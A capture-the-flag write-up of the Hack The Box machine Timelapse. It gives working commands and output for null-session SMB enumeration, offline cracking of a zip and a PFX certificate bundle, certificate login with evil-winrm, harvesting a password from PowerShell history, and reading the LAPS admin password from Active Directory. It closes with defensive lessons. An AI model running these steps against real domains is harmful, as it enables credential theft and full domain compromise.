---
layout: post
title: "A Key Left in the Backup"
subtitle: "HTB Timelapse, where a forgotten zip on an open share holds a certificate that logs you in, and a service account's own shell history confesses the password to the keys of the kingdom"
date: 2022-08-27 12:00:00 +0000
description: "An easy Active Directory box that is really a lecture on secrets that outlive the cleanup: a certificate in a backup zip, a password typed into history, and LAPS handing out the admin key to whoever was on the list."
image: /assets/og/a-key-left-in-the-backup.png
tags: [hackthebox, writeup]
---

Timelapse is a domain controller that never cleaned up after itself. Nobody forces a door here. You walk onto an open share, find a backup zip somebody left lying around, and inside it is a certificate that is its own login. No password to guess, just a key to unwrap. From there the box keeps handing you secrets that should have been shredded years ago. A service account password typed straight into a shell's memory. A group membership that lets you ask Active Directory, politely, for the local administrator password and have it answer. Every step is a leftover. The box is named for what it is, a slow exposure built up frame by frame, each careless minute developed into something an attacker can read.

```
        T I M E L A P S E
        =================
        \\Shares\Dev\  →  winrm_backup.zip
                          (the door was never locked)
                   |
                   v
        a cert that IS the login.  no password, a key.
                   |
                   v
        shell history whispers the next account's password.
        a group lets you ask AD for the admin key,
        and AD just... tells you.
                                            鍵
```

## 0x01 · the open drawer

`nmap` comes back screaming Windows domain controller. Kerberos, LDAP, the global catalog, SMB, and a WinRM listener wearing TLS on 5986.

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn
389/tcp  open  ldap          Active Directory LDAP (timelapse.htb)
445/tcp  open  microsoft-ds
636/tcp  open  ssl/ldap
5986/tcp open  ssl/http      Microsoft HTTPAPI httpd 2.0
9389/tcp open  mc-nmf        .NET Message Framing
```

The host calls itself `DC01.timelapse.htb`. One detail to file away for later, because it earns its keep: nmap also flags a clock skew of about eight hours between you and the box. On a Kerberos host that matters more than it looks, since Kerberos refuses tickets when the clocks disagree by too much. Hold that thought.

The first real move on any AD box is the same as knocking on every window to see which one is unlatched. List the SMB shares.

```
$ smbclient -L //10.10.10.152 -N
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk
        C$              Disk
        IPC$            IPC
        NETLOGON        Disk
        Shares          Disk
        SYSVOL          Disk
```

`Shares` is not a default. It is somebody's idea, and somebody's ideas are where the loot lives. You connect with no password at all, the `-N` for a null session, and the door swings open.

## 0x02 · the backup nobody burned

Inside `Shares` are two folders, `Dev` and `HelpDesk`. The `Dev` folder holds a single file, `winrm_backup.zip`. Picture a company that locks the building every night but leaves a spare key taped under a flowerpot labeled "backup." The lock works perfectly. The flowerpot is the problem.

Pull the zip down and it asks for a password. This is the kind of lock that does not survive a wordlist, because the zip format leaks enough to test guesses offline at enormous speed. You convert the archive into a crackable hash and let `john` run `rockyou` against it.

```
$ zip2john winrm_backup.zip > backup.hash
$ john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash
supremelegacy    (winrm_backup.zip)
```

`supremelegacy`, found instantly. Think of `zip2john` like a locksmith who can take a photo of a lock and try a million keys against the photo in his garage, never touching the real door, never tripping an alarm. That is the quiet menace of an encrypted file you can download. The attacker brute-forces it at home, on their own time, and the server never knows.

Unzip it and out falls `legacyy_dev_auth.pfx`.

## 0x03 · the key that is the login

A `.pfx` is a PKCS#12 bundle, a little envelope that carries both a certificate and its matching private key. On a Windows host that trusts certificates for login, that bundle is not a hint toward a password. It is the credential itself. The trouble is the envelope is sealed with its own password, and it is a different one from the zip.

Same game, different file. `pfx2john` renders the bundle into a hash, and `john` runs `rockyou` again.

```
$ pfx2john legacyy_dev_auth.pfx > pfx.hash
$ john --wordlist=/usr/share/wordlists/rockyou.txt pfx.hash
thuglegacy       (legacyy_dev_auth.pfx)
```

`thuglegacy`. Now crack the envelope open with `openssl` and split it into its two halves, the certificate that says who you are and the private key that proves it.

```
$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -nodes -out legacyy.key
$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy.crt
```

Think of the certificate as a photo ID with your face on it and the private key as the only matching thumb that fits the scanner. Show the ID, press the thumb, and the door opens. No password is spoken because none is needed. The proof is mathematical, not a secret you recite.

The filename whispers the account, `legacyy`. That WinRM listener back on 5986 speaks TLS, and `evil-winrm` can authenticate with a client certificate instead of a password. The `-S` flag turns on SSL to match the listener, and the key and cert pair is your ID.

```
$ evil-winrm -i 10.10.10.152 -S -k legacyy.key -c legacyy.crt
*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
timelapse\legacyy
*Evil-WinRM* PS C:\Users\legacyy\Documents> type ..\Desktop\user.txt
████████████████████████████████
```

A foothold, and not one byte of password ever crossed the wire.

## 0x04 · the shell that remembered too much

`legacyy` is an ordinary user, so the next move is to look where Windows quietly writes things down. PowerShell keeps a running diary of every command you type, saved between sessions so the up-arrow still works tomorrow. Useful. Also a confessional, if anyone ever typed a password into a command instead of a prompt.

```
*Evil-WinRM* PS> type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
$o = (New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck)
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $o -scriptblock {whoami}
```

There it is, in plaintext, a whole credential built by hand. The username `svc_deploy` and the password `E3R$Q62^12p7PLlC%KWaxuaV`, typed directly into a command so an admin could test a remote session. Picture someone writing their bank PIN on a sticky note so they would not forget it during a phone call, then leaving the note in a shared drawer. The note did its job. It just also outlived the call by a couple of years.

`svc_deploy` is also in the Remote Management Users group, so the keys work on WinRM. Log in as them.

```
$ evil-winrm -i 10.10.10.152 -S -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV'
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami
timelapse\svc_deploy
```

## 0x05 · asking AD for the master key

Now the privesc, and it is not an exploit. It is a permission, used exactly as designed, by the wrong person. Check what groups `svc_deploy` belongs to.

```
*Evil-WinRM* PS> net user svc_deploy
Local Group Memberships  *LAPS_Readers  *Remote Management Use...
```

`LAPS_Readers`. LAPS is the Local Administrator Password Solution, Microsoft's fix for the old nightmare where every machine in a company shared one local admin password, so cracking one cracked them all. LAPS sets a unique, random local admin password on each host and stows it in Active Directory, then hands out read access only to a chosen few. Good design. The whole point is that the password rotates and stays secret from everyone except the readers.

But `svc_deploy` is a reader. So you simply ask the directory for the password it is holding, and because you are on the list, it answers. The secret lives in an attribute named `ms-mcs-admpwd`.

```
*Evil-WinRM* PS> Get-ADComputer DC01 -Properties ms-mcs-admpwd | select -ExpandProperty ms-mcs-admpwd
uM[3va(s870g6Y]9i]6tMu{j
```

Think of LAPS like a hotel front desk that keeps every room's key behind the counter and will only hand one over to staff on the approved list. The system is sound. The flaw is that a deployment service account, which exists to push software, somehow ended up wearing a staff badge. It asked for the master key, and the desk handed it over without blinking, because that is its job.

That string is the local administrator password. Walk in.

```
$ evil-winrm -i 10.10.10.152 -S -u administrator -p 'uM[3va(s870g6Y]9i]6tMu{j'
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
timelapse\administrator
```

The root flag is not on the Administrator desktop where you expect it. It lives over on a `TRX` account's desktop, a small misdirection, but as administrator you read it wherever it hides.

```
*Evil-WinRM* PS> type C:\Users\TRX\Desktop\root.txt
████████████████████████████████
```

And the clock skew from section one? It is the reason you reach for `evil-winrm` and certificate or password auth over WinRM rather than fighting Kerberos directly. Kerberos checks the clock and slams the door on a ticket that is eight hours stale. WinRM over TLS does not care what time you think it is. The box quietly nudges you onto the path that ignores the clock, which is a tidy little joke for a machine named Timelapse.

## 0x06 · the honest caveat

Not one step on Timelapse was a software vulnerability. There is no CVE to cite, no patch that would have closed this. Every door was held open from the inside by a secret that should have been destroyed and was not.

That is the uncomfortable part, because you cannot `apt upgrade` your way out of it. A backup zip on a readable share is a feature working as intended until you notice it carries a login certificate. A password in PowerShell history is the up-arrow doing its job until you remember that admin typed a credential into a command line. LAPS is a genuine security improvement, arguably the most correct thing on the whole box, right up until the read permission lands on a service account that had no business holding it. Each of these is a tool doing precisely what it was told. The mistake was upstream of the tool, in a human who left a secret somewhere it would outlive its usefulness.

The pattern underneath all three is the lifespan of a secret. A password, a key, a certificate, these are not meant to be permanent fixtures. They are supposed to be created, used, and retired. Timelapse is a museum of secrets that skipped the last step. The zip should have been deleted after the restore. The history file should never have held a plaintext password. The reader group should have been audited the day after it was created. None of that is exotic. All of it is the kind of small, dull hygiene that nobody notices until the day a stranger reads it back to you.

## 0x07 · outro

```
the door was open. the backup was still there.
the key was inside it, and the key was the login.

the shell remembered a password no one came back to erase,
and the directory handed over the master key to a badge that fit.

nothing was forced. everything was simply left behind.

delete the backup. clear the history. wear black.

                                                            EOF
```

---

*HTB: Timelapse, retired 20 Aug 2022. An easy Windows box that is really a lecture on the shelf life of a secret, dressed in a certificate, a shell history, and a LAPS read nobody pruned. Every door was unlocked from the inside, years before you arrived.*